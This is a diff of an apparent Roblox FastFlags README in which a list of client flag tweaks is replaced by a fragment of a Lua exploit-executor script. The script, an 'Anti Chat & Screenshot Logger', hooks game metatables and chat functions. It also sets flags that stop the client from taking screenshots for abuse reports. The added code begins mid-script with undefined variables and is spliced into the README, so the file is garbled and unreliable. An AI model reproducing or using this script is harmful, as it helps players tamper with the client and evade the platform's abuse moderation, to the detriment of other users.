-<h1 align="center">other fflags</h1>
+local PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui") do
+    if not PlayerGui then
+        local Timer = tick() + 5
+        repeat task.wait() until Player:FindFirstChildWhichIsA("PlayerGui") or (tick() > Timer)
+        PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui") or false
+        if not PlayerGui then
+            return Notify(NotificationTitle, "Failed to find PlayerGui!", 10)
+        end
+    end
+end
 
-### Disable In-game Advertisements
-```json
-{ "FFlagAdServiceEnabled": "False" }
-```
+if getgenv().AntiChatLogger then
+    return Notify(NotificationTitle, "Anti Chat & Screenshot Logger already loaded!", 15)
+else
+    getgenv().AntiChatLogger = true
+end
 
-### Disable Telemetry 
-```json
-{ "FFlagDebugDisableTelemetryEphemeralCounter": "True", "FFlagDebugDisableTelemetryEphemeralStat": "True", "FFlagDebugDisableTelemetryEventIngest": "True", "FFlagDebugDisableTelemetryPoint": "True", "FFlagDebugDisableTelemetryV2Counter": "True", "FFlagDebugDisableTelemetryV2Event": "True", "FFlagDebugDisableTelemetryV2Stat": "True" }
-```
-### Adjust Scroll Speed
-```json
-{ "FIntScrollWheelDeltaAmount": "140" }
-```
-### Surf the web inside of Roblox
-###### Click the Beta badge or the 13+ badge to open the webview browser.
-```json
-{ "FFlagTopBarUseNewBadge": "True", "FStringTopBarBadgeLearnMoreLink": "https://google.com/", "FStringVoiceBetaBadgeLearnMoreLink": "https://google.com/" }
-```
-### Sounds use physical velocity and become distorted
-###### <2017
-```json
-{ "FFlagSoundsUsePhysicalVelocity": "True" }
-```
-### Shows the state of a flag
-```json
-{ "FStringDebugShowFlagState": "FLAG_HERE" }
-```
-###### e.g
-```json
-{ "FStringDebugShowFlagState": "DFIntTaskSchedulerTargetFps, ChannelName" }
-```
-### MTU 
-```json
-{ "DFIntConnectionMTUSize": "MTU_HERE" }
-```
-### No Internet Disconnect 
-###### *[You will still be kicked but the message wont show.]*
-```json
-{ "DFFlagDebugDisableTimeoutDisconnect": "True" }
-```
-### Quick Game Launch 
-###### *[BUGGY]*
-```json
-{ "FFlagEnableQuickGameLaunch": "True" }
-```
-### Allows you to change voice chat distance 
-###### default: [Min 7 Max 80]
-```json
-{ "DFIntVoiceChatRollOffMinDistance": "7", "DFIntVoiceChatRollOffMaxDistance": "80" }
-```
-### Disable In-Game Purchases
-```json
-{ "DFFlagOrder66": "True" }
-```
-### Disable Chat
-```json
-{ "FFlagDebugForceChatDisabled": "True" }
-```
-### Limit audios that are being played
-```json
-{ "DFIntMaxLoadableAudioChannelCount": "1" }
-```
-### Adds an UI in game, which highlights any part player touches (like ground, Meshes etc.). It's a non-functioning UI too. Also adds a blue circle to your humanoid.
-```json
-{ "FFlagDebugHumanoidRendering": "True" }
-```
-### Custom Disconnect Message
-```json
-{ "FFlagReconnectDisabled": "True", "FStringReconnectDisabledReason": "You're stupid and I hate you" }
-```
-### Display FPS
-```json
-{ "FFlagDebugDisplayFPS": "True" }
-```
-### Verified Badge
-###### https://en.help.roblox.com/hc/en-us/articles/7997207259156-Verified-Badge-FAQ
-```json
-{ "FStringWhitelistVerifiedUserId": "UserID_HERE" }
-```
-### Verified Badge on everyone
-###### https://en.help.roblox.com/hc/en-us/articles/7997207259156-Verified-Badge-FAQ
-```json
-{ "FFlagOverridePlayerVerifiedBadge": "True" }
-```
-### Applies cool colors to stuff
-```json
-{ "FFlagDebugDisplayUnthemedInstances": "True" }
-```
-### Show Outlined Chunks
-```json
-{ "FFlagDebugLightGridShowChunks": "True" }
-```
-### Remove Disconnect Blur/Loading Blur
-```json
-{ "FIntRobloxGuiBlurIntensity": "0" }
-```
-### Disable Dynamic Heads Animations
-###### https://roblox.fandom.com/wiki/Dynamic_Head
-```json
-{ "DFIntAnimationLodFacsDistanceMin": "0", "DFIntAnimationLodFacsDistanceMax": "0", "DFIntAnimationLodFacsVisibilityDenominator": "0" }
-```
-### failsafehumanoid
-###### gray avatars
-```json
-{ "FFlagFailsafeHumanoid_3": "True" }
-```
-### Automatically unmutes your mic on join (VC)
-```json
-{ "FFlagDebugDefaultChannelStartMuted": "False" }
-```
-### Overlay that shows what you type 
-```json
-{ "FFlagDebugTextBoxServiceShowOverlay": "True" }
-```
-### opt-out Experience Language
-###### Removes the Experience Language option in settings
-```json
-{ "FIntV1MenuLanguageSelectionFeaturePerMillageRollout": "0" }
-```
-### Disable New Chat Translation Settings
-```json
-{ "FFlagChatTranslationSettingEnabled3 ": "False" }
-```
-### Lets you change the zoom out limit
-```json
-{ "FIntCameraMaxZoomDistance": "9999" }
-```
-### Limits number of animations being played
-```json
-{ "DFIntMaxActiveAnimationTracks": "0" }
-```
-### Prevents Remote Events from running
-```json
-{ "DFIntRemoteEventSingleInvocationSizeLimit": "1" }
-```
-### Mess with voice chat volume
-###### default 1000
-```json
-{ "DFIntVoiceChatVolumeThousandths": "100000" }
-```
-### Removes the head roll limit
-```json
-{ "DFIntAvatarFaceChatHeadRollLimitDegrees": "360" }
-```
-### VR Controller transparency
-```json
-{ "FIntVRTouchControllerTransparency": "0" }
-```
-### no sound
-```json
-{ "FFlagDebugRomarkMockingAudioDevices": "True" }
-```
+local Metatable = getrawmetatable(StarterGui)
+setreadonly(Metatable, false)
 
-<h1 align="center">Links</h1>
+local MessageEvent = Instance.new("BindableEvent")
 
-### [Make Your Own Custom Roblox Textures](https://github.com/GoingCrazyDude/roblox-custom-textures/blob/main/README.md) *[Github Repo Link]*
-### [MEGA FLAG LIST](https://discord.com/channels/1099468797410283540/1139962301991104582/1170417533355036712) *[Bloxstrap Server]*
-### [Bloxstrap](https://github.com/pizzaboxer/bloxstrap) *[Github Repo Link]*
-### [NVIDIA Shaders Guide](https://github.com/catb0x/Roblox-Shaders-Guide) *[Github Repo Link]*
-### [EnableAnselForRoblox](https://github.com/DED0026/EnableAnselForRoblox) *[Github Repo Link]*
-### [potato fflags](https://github.com/catb0x/Roblox-Potato-FFlags) *[Github Repo Link]*
-### [Fake Roblox Player Internal Patcher](https://github.com/FastFlags/FastFlags-Collective/releases/tag/internal) *[Download Link]*
+if hookmetamethod then
+    local CoreHook do
+        CoreHook = hookmetamethod(StarterGui, "__namecall", newcclosure(function(self, ...)
+            local Method = getnamecallmethod()
+            local Arguments = {...}
+            
+            if self == StarterGui and not checkcaller() then
+                if Method == "SetCoreGuiEnabled" then
+                    local CoreType = Arguments[1]
+                    local Enabled = Arguments[2]
+                    
+                    if table.find(WhitelistedCoreTypes, CoreType) and Enabled == false then -- Thanks Harun for correcting me on the second argument
+                        OldCoreTypeSettings[CoreType] = Enabled
+                        return
+                    end
+                elseif Method == "SetCore" then
+                    local Core = Arguments[1]
+                    local Connection = Arguments[2]
+                    
+                    if Core == "CoreGuiChatConnections" then
+                        OldCoreSetting = Connection
+                        return
+                    end
+                end
+            end
+            
+            return CoreHook(self, ...)
+        end))
+    end
 
+    if not getgenv().ChattedFix then
+        getgenv().ChattedFix = true
+
+        local ChattedFix do
+            ChattedFix = hookmetamethod(Player, "__index", newcclosure(function(self, index)
+                if self == Player and tostring(index):lower():match("chatted") and MessageEvent.Event then
+                    return MessageEvent.Event
+                end
+
+                return ChattedFix(self, index)
+            end))
+        end
+
+        local AnimateChattedFix = task.spawn(function()
+            local ChattedSignal = false
+
+            for _, x in next, getgc() do
+                if type(x) == "function" and getfenv(x).script ~= nil and tostring(getfenv(x).script) == "Animate" then
+                    if islclosure(x) then
+                        local Constants = getconstants(x)
+
+                        for _, v in next, Constants do
+                            if v == "Chatted" then
+                                ChattedSignal = x
+                            end
+                        end
+                    end
+                end
+            end
+
+            if ChattedSignal then
+                ChattedSignal()
+            end
+        end)
+    end
+end
+
+local EnabledChat = task.spawn(function()
+    repeat
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+        task.wait()
+    until StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Chat)
+end)
+
+local WarningGuiThread = task.spawn(function()
+    WarningUI = Instance.new("ScreenGui")
+    Main = Instance.new("Frame")
+    BackgroundHolder = Instance.new("Frame")
+    Background = Instance.new("Frame")
+    TopBar = Instance.new("Frame")
+    UIGradient = Instance.new("UIGradient")
+    TitleHolder = Instance.new("Frame")
+    Title = Instance.new("TextLabel")
+    Holder = Instance.new("Frame")
+    UIListLayout = Instance.new("UIListLayout")
+    Reason_1 = Instance.new("TextLabel")
+    Reason_2 = Instance.new("TextLabel")
+    Reason_3 = Instance.new("TextLabel")
+    WarningText = Instance.new("TextLabel")
+    Exit = Instance.new("TextButton")
+    ImageLabel = Instance.new("ImageLabel")
+    
+    WarningUI.Enabled = false
+    WarningUI.Name = "WarningUI"
+    WarningUI.Parent = CoreGui
+    
+    Main.Name = "Main"
+    Main.Parent = WarningUI
+    Main.AnchorPoint = Vector2.new(.5, .5)
+    Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Main.BackgroundTransparency = 1
+    Main.Position = UDim2.new(.5, 0, .5, 0)
+    Main.Size = UDim2.new(0, 400, 0, 400)
+    
+    BackgroundHolder.Name = "BackgroundHolder"
+    BackgroundHolder.Parent = Main
+    BackgroundHolder.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    BackgroundHolder.BackgroundTransparency = .25
+    BackgroundHolder.BorderSizePixel = 0
+    BackgroundHolder.Size = UDim2.new(1, 0, 1, 0)
+    
+    Background.Name = "Background"
+    Background.Parent = BackgroundHolder
+    Background.AnchorPoint = Vector2.new(.5, .5)
+    Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    Background.BorderSizePixel = 0
+    Background.Position = UDim2.new(.5, 0, .5, 0)
+    Background.Size = UDim2.new(.96, 0, .96, 0)
+    
+    TopBar.Name = "TopBar"
+    TopBar.Parent = Background
+    TopBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TopBar.BorderSizePixel = 0
+    TopBar.Size = UDim2.new(1, 0, 0, 2)
+    
+    UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(53, 149, 146)), ColorSequenceKeypoint.new(.29, Color3.fromRGB(93, 86, 141)), ColorSequenceKeypoint.new(.50, Color3.fromRGB(126, 64, 138)), ColorSequenceKeypoint.new(.75, Color3.fromRGB(143, 112, 112)), ColorSequenceKeypoint.new(1, Color3.fromRGB(159, 159, 80))}
+    UIGradient.Parent = TopBar
+    
+    TitleHolder.Name = "TitleHolder"
+    TitleHolder.Parent = Background
+    TitleHolder.AnchorPoint = Vector2.new(.5, .5)
+    TitleHolder.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    TitleHolder.BorderColor3 = Color3.fromRGB(44, 44, 44)
+    TitleHolder.BorderSizePixel = 2
+    TitleHolder.Position = UDim2.new(.5, 0, .5, 0)
+    TitleHolder.Size = UDim2.new(.9, 0, .9, 0)
+    
+    Title.Name = "Title"
+    Title.Parent = TitleHolder
+    Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    Title.BorderSizePixel = 0
+    Title.Position = UDim2.new(0, 15, 0, -12)
+    Title.Size = UDim2.new(0, 75, 0, 20)
+    Title.Font = Enum.Font.SourceSansBold
+    Title.Text = "Warning"
+    Title.TextColor3 = Color3.fromRGB(235, 235, 235)
+    Title.TextScaled = true
+    Title.TextWrapped = true
+    
+    Holder.Name = "Holder"
+    Holder.Parent = TitleHolder
+    Holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Holder.BackgroundTransparency = 1
+    Holder.Position = UDim2.new(0, 30, .125, 0)
+    Holder.Size = UDim2.new(1, -30, .875, 0)
+    
+    UIListLayout.Parent = Holder
+    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    
+    Reason_1.Name = "Reason_1"
+    Reason_1.Parent = Holder
+    Reason_1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    Reason_1.BackgroundTransparency = 1
+    Reason_1.BorderSizePixel = 0
+    Reason_1.Size = UDim2.new(1, 0, 0, 20)
+    Reason_1.Font = Enum.Font.SourceSans
+    Reason_1.Text = "- TextChatService is enabled"
+    Reason_1.TextColor3 = Color3.fromRGB(199, 40, 42)
+    Reason_1.TextScaled = true
+    Reason_1.TextWrapped = true
+    Reason_1.TextXAlignment = Enum.TextXAlignment.Left
+    Reason_1.Visible = false
+    
+    Reason_2.Name = "Reason_2"
+    Reason_2.Parent = Holder
+    Reason_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    Reason_2.BackgroundTransparency = 1
+    Reason_2.BorderSizePixel = 0
+    Reason_2.Size = UDim2.new(1, 0, 0, 20)
+    Reason_2.Font = Enum.Font.SourceSans
+    Reason_2.Text = "- Legacy chat module was not found"
+    Reason_2.TextColor3 = Color3.fromRGB(199, 40, 42)
+    Reason_2.TextScaled = true
+    Reason_2.TextWrapped = true
+    Reason_2.TextXAlignment = Enum.TextXAlignment.Left
+    Reason_2.Visible = false
+    
+    Reason_3.Name = "Reason_3"
+    Reason_3.Parent = Holder
+    Reason_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    Reason_3.BackgroundTransparency = 1
+    Reason_3.BorderSizePixel = 0
+    Reason_3.Size = UDim2.new(1, 0, 0, 20)
+    Reason_3.Font = Enum.Font.SourceSans
+    Reason_3.Text = "- MessagePosted function was not found"
+    Reason_3.TextColor3 = Color3.fromRGB(199, 40, 42)
+    Reason_3.TextScaled = true
+    Reason_3.TextWrapped = true
+    Reason_3.TextXAlignment = Enum.TextXAlignment.Left
+    Reason_3.Visible = false
+    
+    WarningText.Name = "WarningText"
+    WarningText.Parent = TitleHolder
+    WarningText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    WarningText.BackgroundTransparency = 1
+    WarningText.BorderSizePixel = 0
+    WarningText.Position = UDim2.new(0, 30, .05, 0)
+    WarningText.RichText = true
+    WarningText.Size = UDim2.new(1, -30, 0, 20)
+    WarningText.Font = Enum.Font.SourceSans
+    WarningText.Text = "> Anti-<font color=\"#6ea644\">Chat Logger</font> will not work here!"
+    WarningText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    WarningText.TextScaled = true
+    WarningText.TextWrapped = true
+    WarningText.TextXAlignment = Enum.TextXAlignment.Left
+    
+    Exit.Name = "Exit"
+    Exit.Parent = TitleHolder
+    Exit.AnchorPoint = Vector2.new(.5, .5)
+    Exit.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+    Exit.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    Exit.Position = UDim2.new(.5, 0, .899999976, 0)
+    Exit.Size = UDim2.new(0, 250, 0, 20)
+    Exit.Font = Enum.Font.SourceSans
+    Exit.Text = "Ok"
+    Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Exit.TextScaled = true
+    Exit.TextWrapped = true
+    
+    ImageLabel.Parent = TitleHolder
+    ImageLabel.AnchorPoint = Vector2.new(.5, .5)
+    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    ImageLabel.BackgroundTransparency = 1
+    ImageLabel.Position = UDim2.new(.5, 0, .6, 0)
+    ImageLabel.Size = UDim2.new(.3, 0, .3, 0)
+    ImageLabel.ZIndex = 1
+    ImageLabel.Image = "rbxassetid://12969025384"
+    ImageLabel.ImageColor3 = Color3.fromRGB(40, 40, 40)
+    ImageLabel.ImageTransparency = .5
+    
+    Exit.MouseButton1Down:Connect(function()
+        WarningUI:Destroy()
+    end)
+end)
+
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    WarningUI.Enabled = true
+    Reason_1.Visible = true
+    return
+end
+
+local PlayerScripts = Player:WaitForChild("PlayerScripts")
+local ChatMain = PlayerScripts:FindFirstChild("ChatMain", true) or false
+
+if not ChatMain then
+    local Timer = tick()
+    
+    repeat task.wait() until PlayerScripts:FindFirstChild("ChatMain", true) or tick() > (Timer + 3)
+    ChatMain = PlayerScripts:FindFirstChild("ChatMain", true)
+    
+    if not ChatMain then
+        WarningUI.Enabled = true
+        Reason_2.Visible = true
+        return
+    end
+end
+
+local PostMessage = require(ChatMain).MessagePosted
+
+if not PostMessage then
+    WarningUI.Enabled = true
+    Reason_3.Visible = true
+    return
+end
+
+local OldFunctionHook; OldFunctionHook = hookfunction(PostMessage.fire, function(self, Message)
+    if self == PostMessage then
+        MessageEvent:Fire(Message)
+        return
+    end
+    return OldFunctionHook(self, Message)
+end)
+
+if setfflag then
+    pcall(function()
+        setfflag("AbuseReportScreenshot", "False")
+        setfflag("AbuseReportScreenshotPercentage", "0")
+    end)
+end -- To prevent roblox from taking screenshots of your client.
+
+local Credits = task.spawn(function()
+    local UserIds = {
+        1414978355
+    }
+    
+    if table.find(UserIds, Player.UserId) then
+        return
+    end
+    
+    local Tag = Instance.new("BillboardGui")
+    local Title = Instance.new("TextLabel", Tag)
+    local Rank = Instance.new("TextLabel", Tag)
+    local Gradient = Instance.new("UIGradient", Title)
+    
+    Tag.Brightness = 2
+    Tag.Size = UDim2.new(4, 0, 1, 0)
+    Tag.StudsOffsetWorldSpace = Vector3.new(0, 5, 0)
+    
+    Title.BackgroundTransparency = 1
+    Title.Size = UDim2.new(1, 0, .6, 0)
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextScaled = true
+    
+    Rank.AnchorPoint = Vector2.new(.5, 0)
+    Rank.BackgroundTransparency = 1
+    Rank.Position = UDim2.new(.5, 0, .65, 0)
+    Rank.Size = UDim2.new(.75, 0, .5, 0)
+    Rank.TextColor3 = Color3.fromRGB(0, 0, 0)
+    Rank.TextScaled = true
+    Rank.Text = "< Anti Chat-Logger >"
+    
+    Gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.new(.75, .75, .75)),
+        ColorSequenceKeypoint.new(.27, Color3.new(0, 0, 0)),
+        ColorSequenceKeypoint.new(.5, Color3.new(.3, 0, .5)),
+        ColorSequenceKeypoint.new(0.78, Color3.new(0, 0, 0)),
+        ColorSequenceKeypoint.new(1, Color3.new(.75, .75, .75))
+    })
+    Gradient.Offset = Vector2.new(-1, 0)
+    
+    local GradientTeen = Tween(Gradient, 2, "Circular", "Out", {Offset = Vector2.new(1, 0)})
+    
+    function PlayAnimation()
+    	GradientTeen:Play()
+    	GradientTeen.Completed:Wait()
+    	Gradient.Offset = Vector2.new(-1, 0)
+    	task.wait(.75)
+    	PlayAnimation()
+    end
+    
+    local AddTitle = function(Character)
+        repeat task.wait() until Character
+        
+        local Humanoid = Character and Character:WaitForChild("Humanoid")
+        local RootPart = Humanoid and Humanoid.RootPart
+        
+        if Humanoid then
+            Humanoid:GetPropertyChangedSignal("RootPart"):Connect(function()
+                if Humanoid.RootPart then
+                    Tag.Adornee = RootPart
+                end
+            end)
+        end
+        
+        if RootPart then
+            Tag.Adornee = RootPart
+        end
+    end
+    
+    task.spawn(PlayAnimation)
+    
+    for _, x in next, Players:GetPlayers() do
+        if table.find(UserIds, x.UserId) then
+            Tag.Parent = workspace.Terrain
+            Title.Text = x.Name
+            AddTitle(x.Character)
+            x.CharacterAdded:Connect(AddTitle)
+        end
+    end
+    
+    Players.PlayerAdded:Connect(function(x)
+        if table.find(UserIds, x.UserId) then
+            Tag.Parent = workspace.Terrain
+            Title.Text = x.Name
+            x.CharacterAdded:Connect(AddTitle)
+        end
+    end)
+    
+    Players.PlayerRemoving:Connect(function(x)
+        if table.find(UserIds, x.UserId) then
+            Tag.Parent = game
+        end
+    end)
+end)
+
+task.delay(1, function() WarningUI:Destroy() end)
+
+for _, x in next, OldCoreTypeSettings do
+    if not x then
+        StarterGui:SetCore("ChatActive", false)
+    end
+    StarterGui:SetCoreGuiEnabled(_, x)
+end
+
+if OldCoreSetting then
+    StarterGui:SetCore("CoreGuiChatConnections", OldCoreSetting)
+end
+
+if StarterGui:GetCore("ChatActive") then
+    StarterGui:SetCore("ChatActive", false)
+    StarterGui:SetCore("ChatActive", true)
+end
+
+--Metatable.__namecall = CoreHook
+if CoreHook then
+    setmetatable(Metatable, {__namecall = CoreHook}) 
+end
+setreadonly(Metatable, true)
+
+Notify(NotificationTitle, "Anti Chat & Screenshot Logger Loaded!", 15)
+print(string.format("AnthonyIsntHere's Anti Chat-Logger has loaded in %s seconds.", string.format("%.2f", tostring(tick() - ACL_LoadTime))))
+```
 <h4 align="center">‧⁺̣˚̣̣*̣̩⋆̩·̩̩୨˚̣̣̣̣͙୧·̩̩⋆̩*̣̩˚̣̣⁺̣‧ You've reached the bottom of the list! ‧⁺̣˚̣̣*̣̩⋆̩·̩̩୨˚̣̣̣̣͙୧·̩̩⋆̩*̣̩˚̣̣⁺̣‧୨</h4>
 
 # List Information
-* Creation Date: 9:46 PM 08/25/2023 
-* Github Publish Date: 12/26/2023
-* Maintained by [dan](https://discord.com/users/457151128665194527), [variable](https://discord.com/users/848525666622373890), [popbob](https://discord.com/users/702054592262701127) & [kit](https://discord.com/users/761909750006022195)
 
-[.](https://open.spotify.com/track/0jhYMcAqY9LkMCAYNXKtNK)
-
-###### creds to bloxstrap & rgc
+* Maintained by RFFC
 
 <h3 align="center">FastFlags 2024®<sup>eal</sup></h3>
